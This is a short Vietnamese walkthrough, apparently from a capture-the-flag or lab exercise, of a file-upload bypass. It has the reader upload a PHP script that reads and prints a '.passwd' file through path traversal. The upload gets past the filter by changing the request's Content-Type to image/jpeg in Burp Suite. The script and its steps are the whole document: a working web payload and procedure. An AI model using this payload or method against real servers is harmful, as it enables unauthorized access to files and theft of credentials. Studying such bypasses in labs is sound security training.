Dùng Burp Suite để bắt request, upload file `harm.php` với code như sau:

```php
 <?php
$file = fopen("../../../.passwd", "r");

while(! feof($file)) {
  $line = fgets($file);
  echo $line. "<br>";
}

fclose($file);
?> 
```

Bật intercept, gửi request, chuyển Content-type thành image/jpeg rồi forward, ta sẽ lấy được password ở đường dẫn `/harm.php`